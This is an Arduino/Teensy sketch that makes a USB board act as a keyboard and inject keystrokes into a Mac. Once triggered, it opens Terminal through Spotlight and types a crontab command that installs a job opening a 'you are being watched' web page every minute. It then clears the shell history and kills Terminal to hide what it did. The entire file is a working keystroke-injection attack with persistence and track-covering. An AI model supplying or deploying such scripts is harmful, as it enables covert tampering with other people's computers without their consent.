#include <Bounce.h>

Bounce btn = Bounce(2, 10);

void setup() {
  // make pin 2 an input and turn on the
  // pullup resistor so it goes high unless
  // connected to ground:
  pinMode(2, INPUT_PULLUP);
  Keyboard.begin();
}

void loop() {

  // Using a button to trigger the keys 
  // This also gives you some time to disable the new keyboard configuration popup (just close it)
  while (digitalRead(2) == HIGH) {
    // do nothing until pin 2 goes low
    delay(250);
  }

  // Search for Terminal

  // Shortcut to Spotlight
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(100);

  // Type Terminal and open it
  Keyboard.print("Terminal.");
  delay(250);
  Keyboard.set_key1(KEY_RETURN);
  Keyboard.send_now();
  Keyboard.set_key1(0); // Setting key back to 0
  Keyboard.send_now();
  delay(200);

  // Add a new cron job
  // English version
  // Keyboard.println("   (crontab -l 2>/dev/null; echo \"* * * * * say -v Whisper Apple is watching you\")| crontab -");
  // French version
  //Keyboard.println("   (crontab -l 2>/dev/null; echo \"* * * * * say -v Thomas Vous aites observer. Apple aipie vos faits et gestes\")| crontab -");

  // Open a web page usign the default browser
  //  Keyboard.println("   (crontab -l 2>/dev/null; echo \"* * * * * open http://hellocatfood.com\" | crontab -");
  Keyboard.println("   (crontab -l 2>/dev/null; echo \"* * * * * open 'http://02020202.fr/a/?msg=Apple vous observe&lang=fr-FR&delay=2000'\") | crontab -");

  //
  //  // Clean after yourself
  Keyboard.println("  history -c");
  Keyboard.println("  reset");
  //
  //  // Close the Terminal
  Keyboard.println(" killall Terminal");
  delay(100); // Leave some time to type
  Keyboard.set_key1(KEY_RETURN);
  Keyboard.send_now();
  Keyboard.set_key1(0); // Setting key back to 0
  Keyboard.send_now();

  delay(1000);

}

